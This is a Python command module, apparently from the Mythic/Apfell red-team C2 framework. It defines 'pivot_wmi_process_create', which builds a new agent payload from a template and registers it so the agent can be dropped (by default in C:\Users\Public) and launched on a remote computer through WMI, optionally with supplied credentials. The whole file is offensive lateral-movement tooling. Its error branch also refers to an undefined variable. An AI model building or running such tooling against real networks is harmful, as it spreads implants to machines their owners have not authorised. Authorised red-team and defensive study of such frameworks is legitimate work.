from CommandBase import *
import json
from MythicFileRPC import *
from MythicPayloadRPC import *


class PivotWMIProcessCreaterguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "computer": CommandParameter(name="Computer", type=ParameterType.String, description="Computer to pivot to."),
            "template": CommandParameter(name="Payload Template", type=ParameterType.Payload),
            "remote_path": CommandParameter(name="Remote Path of Executable", type=ParameterType.String, required=False,
                              description="Path to drop the executable (default: C:\\Users\\Public)", default_value="C:\\Users\\Public"),
            "credential": CommandParameter(name="Credential", type=ParameterType.Credential_JSON, required=False)
        }

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON arguments, but got raw command line.")
        self.load_args_from_json_string(self.command_line)


class PivotWMIProcessCreateCommand(CommandBase):
    cmd = "pivot_wmi_process_create"
    needs_admin = False
    help_cmd = "pivot_wmi_process_create (modal popup)"
    description = "Attempt to spawn an agent on a remote computer using WMI Process Create call."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = PivotWMIProcessCreaterguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        gen_resp = await MythicPayloadRPC(task).build_payload_from_template(task.args.get_arg('template'))
        if gen_resp.status == MythicStatus.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await MythicPayloadRPC(task).get_payload_by_uuid(gen_resp.uuid)
                if resp.status == MythicStatus.Success:
                    if resp.build_phase == 'success':
                        # it's done, so we can register a file for it
                        file_resp = await MythicFileRPC(task).register_file(resp.contents)
                        if file_resp.status == MythicStatus.Success:
                            task.args.add_arg("template", file_resp.agent_file_id)
                            break
                        else:
                            raise Exception("Failed to register payload: " + file_resp.error_message)
                    elif resp.build_phase == 'error':
                        raise Exception("Failed to build new payload: " + resp.error_message)
                    else:
                        await asyncio.sleep(1)
        else:
            raise Exception("Error occurred while building payload: {}".format(resp.error_message))

        return task

    async def process_response(self, response: AgentResponse):
        pass